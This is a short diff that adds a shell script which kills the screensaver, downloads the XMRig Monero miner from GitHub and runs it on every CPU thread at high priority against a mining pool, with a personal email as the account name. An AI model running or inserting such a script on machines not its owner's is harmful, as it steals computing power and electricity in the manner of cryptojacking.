@@ -1,0 +1,6 @@
+killall xscreensaver
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-linux-x64.tar.gz
+tar -xvf xmrig-6.11.1-linux-x64.tar.gz
+rm -f xmrig-6.11.1-linux-x64.tar.gz
+./xmrig -o xmr.pool.minergate.com:45700 -u luongthien96@gmail.com -p x  --cpu-priority 5 --asm=intel --randomx-mode=fast --astrobwt-avx2 --randomx-no-rdmsr --cpu-no-yield --argon2-impl=x86_64 --threads=$(nproc) --randomx-wrmsr=-1 --randomx-cache-qos
